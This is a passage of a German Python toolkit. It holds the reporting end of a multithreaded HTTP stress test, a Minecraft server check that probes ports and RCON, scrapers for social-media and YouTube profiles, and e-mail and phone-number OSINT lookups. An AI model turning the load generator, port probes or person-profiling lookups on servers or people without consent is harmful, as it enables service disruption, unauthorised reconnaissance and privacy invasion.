        i += 1

    for t in all_threads:
        t.join()

    total_time = time.time() - start_all
    total_reqs = len(results) + len(errors)
    print(f"\r  {G}{'█'*30}{R} {G}Fertig! {total_reqs} Requests in {total_time:.1f}s{R}          \n")

    # ── Auswertung ───────────────────────────────────────────────
    W = 62
    T = f"  {DG}╔{'═'*W}╗{R}"
    B = f"  {DG}╚{'═'*W}╝{R}"
    M = f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    times_ms   = [r[0] for r in results]
    ok_count   = sum(1 for r in results if 200 <= r[1] < 400)
    err_count  = len(errors) + sum(1 for r in results if r[1] >= 400 or r[1] < 200)
    avg_ms     = sum(times_ms)/len(times_ms) if times_ms else 0
    min_ms     = min(times_ms) if times_ms else 0
    max_ms     = max(times_ms) if times_ms else 0
    median_ms  = sorted(times_ms)[len(times_ms)//2] if times_ms else 0
    p95_ms     = sorted(times_ms)[int(len(times_ms)*0.95)] if times_ms else 0
    rps        = len(results) / total_time if total_time > 0 else 0
    total_kb   = sum(r[2] for r in results) / 1024
    success_pct= ok_count/total_reqs*100 if total_reqs > 0 else 0

    # Status-Code Verteilung
    from collections import Counter
    status_cnt = Counter(r[1] for r in results)

    # Bewertung
    if avg_ms < 100:   rating = f"{G}SEHR GUT{R}"
    elif avg_ms < 300: rating = f"{G}GUT{R}"
    elif avg_ms < 800: rating = f"{YG}MITTEL{R}"
    elif avg_ms < 2000:rating = f"{G}LANGSAM{R}"
    else:              rating = f"{G}SEHR LANGSAM{R}"

    print(T)
    print(L(f"{YG}⬡ STRESS-TEST ERGEBNIS  {DG}│  {G}{target[:36]}{R}"))
    print(M)
    print(L(f"{DG}Requests gesamt {R}{G}{total_reqs}{R}"))
    print(L(f"{DG}Erfolgreich     {R}{G}{ok_count}  ({success_pct:.1f}%){R}"))
    print(L(f"{DG}Fehlgeschlagen  {R}{G}{err_count}{R}"))
    print(L(f"{DG}Gesamtzeit      {R}{G}{total_time:.2f}s{R}"))
    print(L(f"{DG}Req/Sekunde     {R}{YG}{rps:.1f}{R}"))
    print(L(f"{DG}Daten empfangen {R}{G}{total_kb:.1f} KB{R}"))
    print(M)
    print(L(f"{YG}── Antwortzeiten ──{R}"))
    print(L(f"{DG}Durchschnitt    {R}{G}{avg_ms:.0f} ms{R}  {rating}"))
    print(L(f"{DG}Minimum         {R}{G}{min_ms:.0f} ms{R}"))
    print(L(f"{DG}Maximum         {R}{G}{max_ms:.0f} ms{R}"))
    print(L(f"{DG}Median          {R}{G}{median_ms:.0f} ms{R}"))
    print(L(f"{DG}95. Perzentil   {R}{G}{p95_ms:.0f} ms{R}"))
    if status_cnt:
        print(M)
        print(L(f"{YG}── Status-Codes ──{R}"))
        for code, cnt in sorted(status_cnt.items()):
            col = G if 200 <= code < 400 else YG
            print(L(f"  {col}HTTP {code:<6}{R} {G}{cnt}x{R}"))
    if errors:
        print(M)
        print(L(f"{YG}── Fehler (erste 5) ──{R}"))
        for e in list(set(errors))[:5]:
            print(L(f"  {DG}{e[:56]}{R}"))
    print(B)
    wait()

def mc_health_check():
    hdr("MC SERVER HEALTH-CHECK")
    print(f"  {DG}Analysiert deinen Minecraft-Server auf Konfiguration & Sicherheit.{R}\n")
    host = inp("Server-IP / Domain").strip()
    if not host: wait(); return
    try:
        port = int(input(f"  {G}>{R} Port [25565]: ").strip() or "25565")
    except ValueError:
        port = 25565

    div()
    print(f"  {DG}Starte Health-Check für {G}{host}:{port}{R} ...\n")

    W = 64
    T = f"  {DG}╔{'═'*W}╗{R}"
    B = f"  {DG}╚{'═'*W}╝{R}"
    M = f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    issues  = []
    ok_list = []

    # ── 1. DNS ───────────────────────────────────────────────────
    print(f"  {DG}[1/8] DNS auflösen ...{R}", end="", flush=True)
    try:
        ip = socket.gethostbyname(host)
        print(f"\r  {G}[1/8] DNS → {ip}{R}              ")
    except:
        print(f"\r  {G}[1/8] DNS fehlgeschlagen{R}")
        print(T); print(L(f"{G}[!] Host nicht erreichbar: {host}{R}")); print(B)
        wait(); return

    # ── 2. Port-Check ────────────────────────────────────────────
    print(f"  {DG}[2/8] Port-Check ...{R}", end="", flush=True)
    try:
        s = socket.socket(); s.settimeout(5); s.connect((ip, port)); s.close()
        port_open = True
        print(f"\r  {G}[2/8] Port {port} offen ✓{R}              ")
    except:
        port_open = False
        print(f"\r  {G}[2/8] Port {port} NICHT erreichbar{R}")
        issues.append("Port nicht erreichbar — Portweiterleitung prüfen")

    # ── 3. MC Status-Ping ────────────────────────────────────────
    motd = version = proto_ver = ""; online = maxp = 0; ping_ms = 0
    sample_players = []; has_favicon = False; raw_ping_data = {}
    print(f"  {DG}[3/8] MC Status-Ping ...{R}", end="", flush=True)
    if port_open:
        try:
            t0 = time.time()
            s = socket.socket(); s.settimeout(5); s.connect((ip, port))
            hb  = host.encode()
            pkt = b"\x00" + _varint_w(760) + _varint_w(len(hb)) + hb + port.to_bytes(2,"big") + b"\x01"
            s.sendall(_varint_w(len(pkt)) + pkt + b"\x01\x00")
            _varint_r(s); _varint_r(s)
            jlen = _varint_r(s); data = b""
            while len(data) < jlen:
                c = s.recv(min(4096, jlen-len(data)))
                if not c: break
                data += c
            s.close()
            ping_ms = (time.time()-t0)*1000
            d = json.loads(data.decode())
            raw_ping_data = d
            raw_motd = d.get("description","")
            if isinstance(raw_motd, dict):
                raw_motd = raw_motd.get("text","") + "".join(
                    e.get("text","") for e in raw_motd.get("extra",[]))
            motd = re.sub(r'§.', '', str(raw_motd)).strip()
            ver  = d.get("version",{})
            version    = ver.get("name","?")
            proto_ver  = str(ver.get("protocol","?"))
            pl         = d.get("players",{})
            online     = pl.get("online",0)
            maxp       = pl.get("max",0)
            sample_players = [p.get("name","?") for p in pl.get("sample",[]) if p.get("name")]
            has_favicon = bool(d.get("favicon",""))
            print(f"\r  {G}[3/8] Status-Ping OK ({ping_ms:.0f}ms) ✓{R}              ")
        except:
            print(f"\r  {G}[3/8] Keine MC-Antwort{R}")
            issues.append("Server antwortet nicht auf MC-Protokoll")
    else:
        print(f"\r  {G}[3/8] Übersprungen{R}")

    # ── 4. Query-Protokoll (UDP) — Plugins, Map ──────────────────
    query_data = {}
    print(f"  {DG}[4/8] Query-Protokoll (Plugins/Map) ...{R}", end="", flush=True)
    try:
        import struct
        qs = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        qs.settimeout(3)
        # Handshake
        qs.sendto(b"\xFE\xFD\x09\x01\x02\x03\x04", (ip, port))
        resp, _ = qs.recvfrom(1024)
        challenge = int(resp[5:].split(b"\x00")[0])
        cb = struct.pack(">i", challenge)
        # Full stat request
        qs.sendto(b"\xFE\xFD\x00\x01\x02\x03\x04" + cb + b"\x00\x00\x00\x00", (ip, port))
        resp2, _ = qs.recvfrom(4096)
        qs.close()
        # Parse key-value pairs
        parts = resp2[11:].split(b"\x00\x01player_\x00\x00")
        kv_raw = parts[0].split(b"\x00")
        for i in range(0, len(kv_raw)-1, 2):
            k = kv_raw[i].decode(errors="ignore")
            v = kv_raw[i+1].decode(errors="ignore")
            if k: query_data[k] = v
        # Players
        if len(parts) > 1:
            player_raw = parts[1].rstrip(b"\x00").split(b"\x00")
            query_data["_players"] = [p.decode(errors="ignore") for p in player_raw if p]
        print(f"\r  {G}[4/8] Query OK — {len(query_data)} Felder ✓{R}              ")
        ok_list.append("Query-Protokoll aktiv (Plugins sichtbar)")
    except:
        query_data = {}
        print(f"\r  {G}[4/8] Query deaktiviert (normal){R}")
        ok_list.append("Query-Protokoll deaktiviert (gut für Sicherheit)")

    # ── 5. Zusätzliche Ports prüfen ──────────────────────────────
    print(f"  {DG}[5/8] Zusätzliche Ports ...{R}", end="", flush=True)
    rcon_open  = False
    query_open = False
    for chk_port, name in [(25575,"RCON"),(25565,"Query-UDP")]:
        try:
            if name == "Query-UDP":
                us = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                us.settimeout(2); us.sendto(b"\xFE\xFD\x09\x01\x02\x03\x04",(ip,chk_port))
                us.recvfrom(64); us.close(); query_open = True
            else:
                ts = socket.socket(); ts.settimeout(2); ts.connect((ip,chk_port)); ts.close()
                rcon_open = True
        except:
            pass
    print(f"\r  {G}[5/8] Port-Scan fertig ✓{R}              ")
    if rcon_open:
        issues.append("RCON-Port 25575 offen! Absichern oder schließen")
    else:
        ok_list.append("RCON-Port geschlossen (gut)")

    # ── 6. Ping-Stabilität (15 Pings) ────────────────────────────
    print(f"  {DG}[6/8] Ping-Stabilität (15x) ...{R}", end="", flush=True)
    stab_times = []; stab_fail = 0
    if port_open:
        for _ in range(15):
            ms, ok, _, _ = _mc_ping_once(host, port, timeout=4)
            if ok: stab_times.append(ms)
            else:  stab_fail += 1
        avg_stab = sum(stab_times)/len(stab_times) if stab_times else 0
        jitter   = max(stab_times)-min(stab_times) if len(stab_times)>1 else 0
        p95      = sorted(stab_times)[int(len(stab_times)*0.95)] if stab_times else 0
        print(f"\r  {G}[6/8] {15-stab_fail}/15 OK, Ø{avg_stab:.0f}ms ✓{R}              ")
    else:
        avg_stab = jitter = p95 = 0; stab_fail = 15
        print(f"\r  {G}[6/8] Übersprungen{R}")

    # ── 7. Software erkennen ─────────────────────────────────────
    print(f"  {DG}[7/8] Software analysieren ...{R}", end="", flush=True)
    software = "Unbekannt"; sw_details = []
    ver_lower = version.lower()
    if   "paper"   in ver_lower: software = "PaperMC"
    elif "purpur"  in ver_lower: software = "Purpur"
    elif "spigot"  in ver_lower: software = "Spigot"
    elif "craftbukkit" in ver_lower: software = "CraftBukkit"
    elif "fabric"  in ver_lower: software = "Fabric"
    elif "forge"   in ver_lower: software = "Forge"
    elif "velocity" in ver_lower: software = "Velocity (Proxy)"
    elif "bungee"  in ver_lower: software = "BungeeCord (Proxy)"
    elif "waterfall" in ver_lower: software = "Waterfall (Proxy)"
    elif "vanilla" in ver_lower: software = "Vanilla"
    # MC-Version aus String extrahieren
    mc_ver_match = re.search(r'1\.\d+\.?\d*', version)
    mc_version = mc_ver_match.group(0) if mc_ver_match else version
    # Plugins aus Query
    plugins_raw = query_data.get("plugins","")
    plugin_list = []
    if plugins_raw:
        # Format: "Software: Plugin1 v1.0; Plugin2 v2.0"
        if ":" in plugins_raw:
            plugins_raw = plugins_raw.split(":",1)[1]
        plugin_list = [p.strip().split(" ")[0] for p in plugins_raw.split(";") if p.strip()]
    map_name = query_data.get("map","")
    print(f"\r  {G}[7/8] Software: {software} ✓{R}              ")

    # ── 8. Sicherheits-Analyse ───────────────────────────────────
    print(f"  {DG}[8/8] Sicherheits-Analyse ...{R}", end="", flush=True)
    time.sleep(0.2)
    print(f"\r  {G}[8/8] Analyse fertig ✓{R}              \n")

    if sample_players:
        issues.append(f"Spielerliste öffentlich ({len(sample_players)} Namen sichtbar)")
    else:
        ok_list.append("Spielerliste versteckt")
    if not has_favicon:
        issues.append("Kein Server-Icon (favicon) gesetzt")
    else:
        ok_list.append("Server-Icon vorhanden")
    if motd in ("", "A Minecraft Server"):
        issues.append("Standard-MOTD — bitte anpassen")
    else:
        ok_list.append("Eigenes MOTD gesetzt")
    if maxp > 0 and maxp < 5:
        issues.append(f"Max-Spieler sehr niedrig ({maxp})")
    if stab_fail > 3:
        issues.append(f"Server instabil — {stab_fail}/15 Pings fehlgeschlagen")
    if jitter > 100:
        issues.append(f"Hoher Jitter ({jitter:.0f}ms) — Last oder Netzwerk prüfen")
    elif jitter < 40 and stab_times:
        ok_list.append(f"Stabiler Ping (Jitter {jitter:.0f}ms)")
    if software in ("Vanilla","CraftBukkit"):
        issues.append(f"{software} — Wechsel zu PaperMC empfohlen (besser & sicherer)")
    elif software in ("PaperMC","Purpur"):
        ok_list.append(f"{software} — empfohlene Server-Software")

    # RAM-Schätzung basierend auf Software & Max-Spieler
    ram_min = 1; ram_emp = 2
    if maxp:
        if maxp <= 10:   ram_min, ram_emp = 1, 2
        elif maxp <= 30: ram_min, ram_emp = 2, 4
        elif maxp <= 100:ram_min, ram_emp = 4, 8
        else:            ram_min, ram_emp = 8, 16
    if software in ("Forge","Fabric") and ram_emp < 4:
        ram_emp = max(ram_emp, 6)

    # Stabilität bewerten
    if stab_fail == 0 and avg_stab < 20:   stab_rating = f"{G}AUSGEZEICHNET{R}"
    elif stab_fail <= 1 and avg_stab < 80: stab_rating = f"{G}GUT{R}"
    elif stab_fail <= 3:                    stab_rating = f"{YG}MITTEL{R}"
    else:                                   stab_rating = f"{G}SCHLECHT{R}"

    # ── Ausgabe ──────────────────────────────────────────────────
    print(T)
    print(L(f"{YG}⬡ MC SERVER HEALTH-CHECK  {DG}│  {G}{host}:{port}{R}"))
    print(M)
    print(L(f"{YG}── Server-Info ──{R}"))
    print(L(f"{DG}IP               {R}{G}{ip}{R}"))
    print(L(f"{DG}Port             {R}{G}{port}  ({'offen' if port_open else 'GESCHLOSSEN'}){R}"))
    print(L(f"{DG}MC-Version       {R}{G}{mc_version}{R}"))
    print(L(f"{DG}Protokoll-Nr.    {R}{G}{proto_ver}{R}"))
    print(L(f"{DG}Software         {R}{G}{software}  ({version[:40]}){R}"))
    if motd:
        print(L(f"{DG}MOTD             {R}{G}{motd[:50]}{R}"))
    print(L(f"{DG}Spieler          {R}{G}{online} / {maxp}{R}"))
    print(L(f"{DG}Server-Icon      {R}{G}{'✓ vorhanden' if has_favicon else '✗ keins'}{R}"))
    if map_name:
        print(L(f"{DG}Welt/Map         {R}{G}{map_name}{R}"))
    if query_data.get("gametype"):
        print(L(f"{DG}Spielmodus       {R}{G}{query_data.get('gametype','')}{R}"))
    print(M)
    print(L(f"{YG}── Plugins (via Query) ──{R}"))
    if plugin_list:
        for i in range(0, len(plugin_list), 3):
            row = "  ".join(f"{G}{p:<20}{R}" for p in plugin_list[i:i+3])
            print(L(row))
    else:
        print(L(f"  {DG}Query deaktiviert — Plugins nicht sichtbar{R}"))
    if sample_players:
        print(M)
        print(L(f"{YG}── Spieler (sichtbar im Ping) ──{R}"))
        for p in sample_players[:8]:
            print(L(f"  {YG}{p}{R}"))
    print(M)
    print(L(f"{YG}── Ping-Stabilität (15 Pings) ──{R}"))
    print(L(f"{DG}Erfolgreich      {R}{G}{15-stab_fail}/15{R}  {stab_rating}"))
    if stab_times:
        print(L(f"{DG}Durchschnitt     {R}{G}{avg_stab:.1f} ms{R}"))
        print(L(f"{DG}Minimum          {R}{G}{min(stab_times):.1f} ms{R}"))
        print(L(f"{DG}Maximum          {R}{G}{max(stab_times):.1f} ms{R}"))
        print(L(f"{DG}Jitter           {R}{G}{jitter:.1f} ms{R}"))
        print(L(f"{DG}95. Perzentil    {R}{G}{p95:.1f} ms{R}"))
    print(M)
    print(L(f"{YG}── Ports ──{R}"))
    print(L(f"{DG}Spieler-Port {port}  {R}{G}{'offen' if port_open else 'geschlossen'}{R}"))
    print(L(f"{DG}RCON 25575       {R}{YG if rcon_open else G}{'OFFEN ⚠' if rcon_open else 'geschlossen ✓'}{R}"))
    print(L(f"{DG}Query UDP        {R}{G}{'aktiv' if query_open else 'deaktiviert'}{R}"))
    print(M)
    print(L(f"{YG}── RAM-Empfehlung ──{R}"))
    print(L(f"{DG}Minimum          {R}{G}{ram_min} GB  (-Xmx{ram_min}G in start.bat){R}"))
    print(L(f"{DG}Empfohlen        {R}{G}{ram_emp} GB  (-Xmx{ram_emp}G in start.bat){R}"))
    print(L(f"{DG}Basis            {R}{DG}(für {maxp if maxp else '?'} Spieler, {software}){R}"))
    print(M)
    print(L(f"{YG}── Sicherheits-Check ──{R}"))
    for o in ok_list:
        print(L(f"  {G}✓ {o}{R}"))
    for iss in issues:
        print(L(f"  {YG}⚠ {iss}{R}"))
    if not issues:
        print(L(f"  {G}✓ Keine Probleme — Server gut konfiguriert!{R}"))
    # Empfehlungen
    recs = []
    if any("MOTD" in i for i in issues):
        recs.append("server.properties → motd=Dein Servername")
    if any("Spielerliste" in i for i in issues):
        recs.append("server.properties → hide-online-players=true")
    if any("Icon" in i for i in issues):
        recs.append("server-icon.png (64x64) in Server-Ordner legen")
    if any("instabil" in i for i in issues):
        recs.append(f"RAM erhöhen: -Xmx{ram_emp}G in start.bat")
    if any("Jitter" in i for i in issues):
        recs.append("Plugins reduzieren, View-Distance senken (server.properties)")
    if any("RCON" in i for i in issues):
        recs.append("server.properties → enable-rcon=false")
    if any("Vanilla" in i or "CraftBukkit" in i for i in issues):
        recs.append("Wechsel zu PaperMC: papermc.io")
    if recs:
        print(M)
        print(L(f"{YG}── Empfehlungen ──{R}"))
        for r in recs:
            print(L(f"  {DG}→ {r}{R}"))
    print(M)
    score = max(0, 10 - len(issues)*2)
    bar_f = int(score/10*20)
    bar   = f"{G}{'█'*bar_f}{DG}{'░'*(20-bar_f)}{R}"
    print(L(f"{YG}Gesamt-Score:  {R}{bar} {G}{score}/10{R}"))
    print(B)
    wait()

# ── 38  TIKTOK / INSTAGRAM LOOKUP ───────────────────────────
def tiktok_instagram_lookup():
    hdr("TIKTOK / INSTAGRAM LOOKUP")
    username = inp("Username (ohne @)").strip().lstrip("@")
    if not username: wait(); return
    div()
    W = 62; T=f"  {DG}╔{'═'*W}╗{R}"; B=f"  {DG}╚{'═'*W}╝{R}"; M=f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    # TikTok via unoffizieller API
    print(f"  {DG}[1/2] TikTok ...{R}", end="", flush=True)
    tt_data = {}
    try:
        url = f"https://www.tiktok.com/@{username}"
        body, status, _ = get(url, timeout=8, headers={"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15"})
        if status == 200:
            followers = re.search(r'"followerCount":(\d+)', body)
            following = re.search(r'"followingCount":(\d+)', body)
            likes     = re.search(r'"heartCount":(\d+)', body)
            videos    = re.search(r'"videoCount":(\d+)', body)
            nickname  = re.search(r'"nickname":"([^"]+)"', body)
            bio       = re.search(r'"signature":"([^"]*)"', body)
            verified  = '"verified":true' in body
            tt_data = {
                "Followers":  followers.group(1) if followers else "?",
                "Following":  following.group(1) if following else "?",
                "Likes":      likes.group(1)     if likes     else "?",
                "Videos":     videos.group(1)    if videos    else "?",
                "Nickname":   nickname.group(1)  if nickname  else username,
                "Bio":        bio.group(1)[:60]  if bio       else "",
                "Verified":   "✓ Ja" if verified else "Nein",
            }
            print(f"\r  {G}[1/2] TikTok OK ✓{R}              ")
        else:
            print(f"\r  {G}[1/2] TikTok nicht gefunden{R}")
    except:
        print(f"\r  {G}[1/2] TikTok nicht erreichbar{R}")

    # Instagram via unoffizieller Endpunkt
    print(f"  {DG}[2/2] Instagram ...{R}", end="", flush=True)
    ig_data = {}
    try:
        url = f"https://www.instagram.com/{username}/?__a=1&__d=dis"
        body, status, _ = get(url, timeout=8, headers={
            "User-Agent":"Instagram 219.0.0.12.117",
            "Accept":"application/json"})
        d = json.loads(body)
        u = d.get("graphql",{}).get("user", d.get("data",{}).get("user",{}))
        if u:
            ig_data = {
                "Followers":  str(u.get("edge_followed_by",{}).get("count","?")),
                "Following":  str(u.get("edge_follow",{}).get("count","?")),
                "Posts":      str(u.get("edge_owner_to_timeline_media",{}).get("count","?")),
                "Full Name":  u.get("full_name","?"),
                "Bio":        (u.get("biography","") or "")[:60],
                "Verified":   "✓ Ja" if u.get("is_verified") else "Nein",
                "Private":    "Ja" if u.get("is_private") else "Nein",
                "Business":   "Ja" if u.get("is_business_account") else "Nein",
            }
            print(f"\r  {G}[2/2] Instagram OK ✓{R}              ")
        else:
            print(f"\r  {G}[2/2] Instagram: kein Profil{R}")
    except:
        print(f"\r  {G}[2/2] Instagram nicht erreichbar / privat{R}")

    print()
    print(T)
    print(L(f"{YG}⬡ SOCIAL MEDIA LOOKUP  {DG}│  {G}@{username}{R}"))
    if tt_data:
        print(M)
        print(L(f"{YG}── TikTok ──{R}"))
        for k,v in tt_data.items():
            print(L(f"{DG}{k:<14}{R}{G}{v}{R}"))
        print(L(f"{DG}{'URL':<14}{R}{G}tiktok.com/@{username}{R}"))
    if ig_data:
        print(M)
        print(L(f"{YG}── Instagram ──{R}"))
        for k,v in ig_data.items():
            print(L(f"{DG}{k:<14}{R}{G}{v}{R}"))
        print(L(f"{DG}{'URL':<14}{R}{G}instagram.com/{username}{R}"))
    if not tt_data and not ig_data:
        print(M)
        print(L(f"{G}Kein Profil gefunden oder Account privat.{R}"))
    print(B)
    wait()

# ── 39  E-MAIL OSINT ─────────────────────────────────────────
def email_osint():
    hdr("E-MAIL OSINT")
    email = inp("E-Mail Adresse").strip().lower()
    if not email or "@" not in email: wait(); return
    user, domain = email.split("@",1)
    div()
    W = 62; T=f"  {DG}╔{'═'*W}╗{R}"; B=f"  {DG}╚{'═'*W}╝{R}"; M=f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    print(f"  {DG}[1/4] Breach-Check (HaveIBeenPwned) ...{R}", end="", flush=True)
    breaches = []
    try:
        body, status, _ = get(
            f"https://haveibeenpwned.com/api/v3/breachedaccount/{urllib.parse.quote(email)}?truncateResponse=false",
            headers={"hibp-api-key":"","User-Agent":"OPEN-VS"}, timeout=6)
        breaches = json.loads(body) if status == 200 else []
        print(f"\r  {G}[1/4] Breach-Check: {len(breaches)} Leaks ✓{R}              ")
    except:
        print(f"\r  {G}[1/4] Breach-Check nicht verfügbar{R}")

    print(f"  {DG}[2/4] Gravatar ...{R}", end="", flush=True)
    gravatar_url = ""; gravatar_exists = False
    try:
        h = hashlib.md5(email.encode()).hexdigest()
        gravatar_url = f"https://www.gravatar.com/avatar/{h}?d=404"
        _, gstatus, _ = get(gravatar_url, timeout=5)
        gravatar_exists = gstatus == 200
        print(f"\r  {G}[2/4] Gravatar: {'gefunden ✓' if gravatar_exists else 'kein Avatar'}{R}              ")
    except:
        print(f"\r  {G}[2/4] Gravatar nicht erreichbar{R}")

    print(f"  {DG}[3/4] Domain-Infos ...{R}", end="", flush=True)
    mx_records = []
    try:
        import subprocess
        out = subprocess.check_output(["nslookup","-type=MX",domain], stderr=subprocess.DEVNULL, timeout=5).decode(errors="ignore")
        mx_records = re.findall(r'mail exchanger = (.+)', out)
        print(f"\r  {G}[3/4] Domain MX: {len(mx_records)} Records ✓{R}              ")
    except:
        print(f"\r  {G}[3/4] DNS nicht verfügbar{R}")

    print(f"  {DG}[4/4] Mögliche Profile ...{R}", end="", flush=True)
    time.sleep(0.3)
    print(f"\r  {G}[4/4] Profile generiert ✓{R}              \n")

    print(T)
    print(L(f"{YG}⬡ E-MAIL OSINT  {DG}│  {G}{email}{R}"))
    print(M)
    print(L(f"{DG}E-Mail         {R}{G}{email}{R}"))
    print(L(f"{DG}Username       {R}{G}{user}{R}"))
    print(L(f"{DG}Domain         {R}{G}{domain}{R}"))
    if mx_records:
        print(L(f"{DG}Mail-Server    {R}{G}{mx_records[0].strip()[:45]}{R}"))
    print(L(f"{DG}Gravatar       {R}{G}{'✓ Avatar vorhanden' if gravatar_exists else 'Kein Avatar'}{R}"))
    if gravatar_exists:
        print(L(f"{DG}Gravatar-URL   {R}{G}{gravatar_url[:55]}{R}"))
    print(M)
    print(L(f"{YG}── Datenlecks ──{R}"))
    if breaches:
        for b in breaches[:8]:
            name = b.get("Name","?")
            date = b.get("BreachDate","?")
            cnt  = b.get("PwnCount",0)
            print(L(f"  {YG}⚠ {name:<22}{R}{DG}{date}  {G}{cnt:,} Accounts{R}"))
        if len(breaches) > 8:
            print(L(f"  {DG}... und {len(breaches)-8} weitere Leaks{R}"))
    else:
        print(L(f"  {G}✓ Keine bekannten Leaks gefunden{R}"))
    print(M)
    print(L(f"{YG}── Mögliche Profile ──{R}"))
    platforms = [
        f"github.com/{user}", f"reddit.com/u/{user}",
        f"twitter.com/{user}", f"instagram.com/{user}",
        f"linkedin.com/in/{user}", f"keybase.io/{user}",
    ]
    for p in platforms:
        print(L(f"  {DG}→ {p}{R}"))
    print(B)
    wait()

# ── 40  TELEFONNUMMER LOOKUP ─────────────────────────────────
def phone_lookup():
    hdr("TELEFONNUMMER LOOKUP")
    print(f"  {DG}Format: +49123456789 (mit Ländervorwahl){R}\n")
    number = inp("Telefonnummer").strip().replace(" ","").replace("-","")
    if not number: wait(); return
    div()
    W = 62; T=f"  {DG}╔{'═'*W}╗{R}"; B=f"  {DG}╚{'═'*W}╝{R}"; M=f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    print(f"  {DG}Analysiere ...{R}", end="", flush=True)

    # Ländervorwahl auswerten
    country_codes = {
        "+1":"USA/Kanada","+44":"Großbritannien","+49":"Deutschland",
        "+43":"Österreich","+41":"Schweiz","+33":"Frankreich",
        "+31":"Niederlande","+39":"Italien","+34":"Spanien",
        "+7":"Russland","+86":"China","+91":"Indien","+81":"Japan",
        "+82":"Südkorea","+55":"Brasilien","+61":"Australien",
        "+90":"Türkei","+48":"Polen","+46":"Schweden","+47":"Norwegen",
        "+45":"Dänemark","+358":"Finnland","+420":"Tschechien",
        "+380":"Ukraine","+30":"Griechenland","+351":"Portugal",
    }
    num_clean = number if number.startswith("+") else "+" + number
    country = "Unbekannt"
    prefix  = ""
    for code in sorted(country_codes.keys(), key=lambda x: -len(x)):
        if num_clean.startswith(code):
            country = country_codes[code]
            prefix  = code
            break

    # Typ bestimmen (grobe Heuristik)
    local = num_clean[len(prefix):]
    num_type = "Unbekannt"
    if prefix == "+49":
        if local.startswith("15") or local.startswith("16") or local.startswith("17"):
            num_type = "Mobil"
        elif local.startswith("800"):
            num_type = "Gebührenfrei"
        elif local.startswith("900"):
            num_type = "Mehrwertdienst"
        else:
            num_type = "Festnetz"
    elif prefix in ("+1","+44"):
        num_type = "Mobil/Festnetz (nicht unterscheidbar)"

    # Nummerformat
    formatted = num_clean

    # Validierung: Länge
    digits = re.sub(r'\D','', num_clean)
    valid = 7 <= len(digits) <= 15

    print(f"\r  {G}Analyse fertig ✓{R}              \n")

    print(T)
    print(L(f"{YG}⬡ TELEFONNUMMER LOOKUP  {DG}│  {G}{num_clean}{R}"))
    print(M)
    print(L(f"{DG}Nummer         {R}{G}{formatted}{R}"))
    print(L(f"{DG}Land           {R}{G}{country}{R}"))
    print(L(f"{DG}Vorwahl        {R}{G}{prefix}{R}"))
    print(L(f"{DG}Typ            {R}{G}{num_type}{R}"))
    print(L(f"{DG}Gültig         {R}{G}{'✓ Ja' if valid else '⚠ Ungültige Länge'}{R}"))
    print(L(f"{DG}Ziffern        {R}{G}{len(digits)}{R}"))
    print(M)
    print(L(f"{YG}── Suche ──{R}"))
    enc = urllib.parse.quote(num_clean)
    searches = [
        ("Google",      f"google.com/search?q={enc}"),
        ("Tellows",     f"tellows.de/num/{num_clean.replace('+','')}"),
        ("WerRuftAn",   f"werruftman.de/nummer/{num_clean.replace('+48','').replace('+49','')}"),
        ("Truecaller",  f"truecaller.com/search/de/{enc}"),
    ]
    for name, url in searches:
        print(L(f"  {DG}→ {name:<14}{R}{G}{url[:45]}{R}"))
    print(B)
    wait()

# ── 41  YOUTUBE KANAL LOOKUP ─────────────────────────────────
def youtube_lookup():
    hdr("YOUTUBE KANAL LOOKUP")
    handle = inp("Kanal-Name oder @Handle (ohne @)").strip().lstrip("@")
    if not handle: wait(); return
    div()
    W = 62; T=f"  {DG}╔{'═'*W}╗{R}"; B=f"  {DG}╚{'═'*W}╝{R}"; M=f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    print(f"  {DG}Suche Kanal ...{R}", end="", flush=True)
    yt_data = {}
    try:
        # Versuche @handle
        for path in [f"@{handle}", f"c/{handle}", handle]:
            try:
                body, status, _ = get(
                    f"https://www.youtube.com/{path}",
                    timeout=8,
                    headers={"User-Agent":"Mozilla/5.0","Accept-Language":"de-DE"})
                if status == 200 and "channelId" in body:
                    channel_id = re.search(r'"channelId":"([^"]+)"', body)
                    subs       = re.search(r'"subscriberCountText":\{"simpleText":"([^"]+)"', body)
                    name       = re.search(r'"title":"([^"]+)","description"', body)
                    desc       = re.search(r'"description":"([^"]{0,200})"', body)
                    videos     = re.search(r'"videosCountText":\{"runs":\[\{"text":"([^"]+)"', body)
                    views      = re.search(r'"viewCountText":\{"simpleText":"([^"]+)"', body)
                    joined     = re.search(r'"joinedDateText".*?"([^"]{4,})"', body)
                    country    = re.search(r'"country":"([^"]+)"', body)
                    verified   = '"BADGE_STYLE_TYPE_VERIFIED"' in body
                    yt_data = {
                        "Kanalname":    name.group(1)      if name      else handle,
                        "Channel-ID":   channel_id.group(1)if channel_id else "?",
                        "Abonnenten":   subs.group(1)      if subs      else "?",
                        "Videos":       videos.group(1)    if videos    else "?",
                        "Aufrufe":      views.group(1)     if views     else "?",
                        "Erstellt":     joined.group(1)    if joined    else "?",
                        "Land":         country.group(1)   if country   else "?",
                        "Verifiziert":  "✓ Ja"             if verified  else "Nein",
                        "URL":          f"youtube.com/{path}",
                    }
                    if desc:
                        yt_data["Beschreibung"] = desc.group(1)[:60].replace("\\n"," ")
                    break
            except: continue
        print(f"\r  {G}{'Kanal gefunden ✓' if yt_data else 'Kanal nicht gefunden'}{R}              \n")
    except:
        print(f"\r  {G}Fehler beim Abrufen{R}\n")

    print(T)
    print(L(f"{YG}⬡ YOUTUBE KANAL  {DG}│  {G}@{handle}{R}"))
    print(M)
    if yt_data:
        for k,v in yt_data.items():
            print(L(f"{DG}{k:<16}{R}{G}{str(v)[:46]}{R}"))
    else:
        print(L(f"{G}Kanal nicht gefunden oder nicht öffentlich.{R}"))
        print(L(f"{DG}→ Suche: {R}{G}youtube.com/@{handle}{R}"))
    print(B)
    wait()

# ── 42  NETZWERK-SCANNER ─────────────────────────────────────
def network_scanner():
    hdr("NETZWERK-SCANNER")
